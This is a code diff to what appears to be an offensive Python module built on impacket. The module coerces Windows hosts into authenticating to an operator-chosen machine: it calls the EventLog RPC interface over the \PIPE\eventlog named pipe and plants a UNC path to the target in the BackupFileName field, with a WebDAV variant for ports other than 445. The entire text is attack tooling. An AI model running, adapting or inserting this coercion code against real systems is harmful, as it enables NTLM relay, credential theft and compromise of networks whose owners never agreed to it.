@@ -3,10 +3,8 @@ from impacket.dcerpc.v5.dtypes import NULL
 
 from . import *
 
-TS = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0')
+TS = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')
 IFACE_UUID = even.MSRPC_UUID_EVEN
-FILTERED_PORT_TIMEOUT = 20
-
 
 class EVENShot(BaseRPCShot):
 
@@ -24,6 +22,7 @@ class EVENShot(BaseRPCShot):
     def destination_port_range():
         return [445]
 
+
     def do_binding(self):
         return r'ncacn_np:%s[\PIPE\eventlog]' % self.destination
 
@@ -33,8 +32,8 @@ class EVENShot(BaseRPCShot):
         str = f"\\??\\UNC\\{self.target}\\share\\file"
 
         if self.trgt_port != 445:
-            # Will only work if WebDav service is working on client OS
-            str = f"\\??\\UNC\\{self.target}@{self.trgt_port}\\DavWWWRoot\\share\\file\x00"
+            # Will only work if WebDav service (WebClient) is running on client OS
+            str = f'\\??\\UNC\\{self.target}@{self.trgt_port}\\DavWWWRoot\\share\\file'
 
         request['UNCServerName'] = NULL
         request['BackupFileName'] = str
